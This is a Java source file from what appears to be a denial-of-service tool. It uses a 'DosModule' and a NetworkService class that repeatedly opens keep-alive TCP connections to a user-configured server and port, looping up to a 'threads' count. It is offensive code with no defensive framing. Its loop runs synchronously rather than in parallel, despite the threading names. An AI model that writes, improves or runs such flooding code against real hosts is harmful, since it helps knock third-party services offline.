package net.utils;

import net.wire.module.DosModule;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by GenericDNS on 16.12.2021.
 */
public record NetworkService(InputStreamScanner inputStreamScanner) {

    public NetworkService(InputStreamScanner inputStreamScanner) {
        this.inputStreamScanner = inputStreamScanner;
        System.out.println(DosModule.getInstance().getPrefix() + "trying to start a new session");
        start();
    }

    public void start() {
        for (int i = 0; i <= Integer.parseInt(inputStreamScanner.threads); i++) {
            if (i == Integer.parseInt(inputStreamScanner.threadBreakPoint)) {
                System.out.println(DosModule.getInstance().getPrefix() + "a new breakpoint occurred");
                int finalI = i;
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            System.out.println(DosModule.getInstance().getPrefix() + "a new breakpoint socket starts");
                            Socket socket = new Socket();
                            socket.setKeepAlive(true);
                            socket.setTrafficClass(2*8+ finalI);
                            socket.connect(new InetSocketAddress(NetworkService.this.inputStreamScanner.server, Integer.parseInt(NetworkService.this.inputStreamScanner.port)));
                            System.out.println(DosModule.getInstance().getPrefix() + " socket | SocketTrafficChannel: " + socket.getTrafficClass());
                            socket.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }, 2 * 2000);
            } else {
                int finalI1 = i;
                new Runnable() {
                    @Override
                    public void run() {
                        try {
                            System.out.println(DosModule.getInstance().getPrefix() + "a new default socket starts");
                            Socket socket = new Socket();
                            socket.setKeepAlive(true);
                            socket.setTrafficClass(2*8+ finalI1);
                            socket.connect(new InetSocketAddress(NetworkService.this.inputStreamScanner.server, Integer.parseInt(NetworkService.this.inputStreamScanner.port)));
                            System.out.println(DosModule.getInstance().getPrefix() + " socket | SocketTrafficChannel: " + socket.getTrafficClass());
                            socket.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }.run();
            }
        }
    }

}
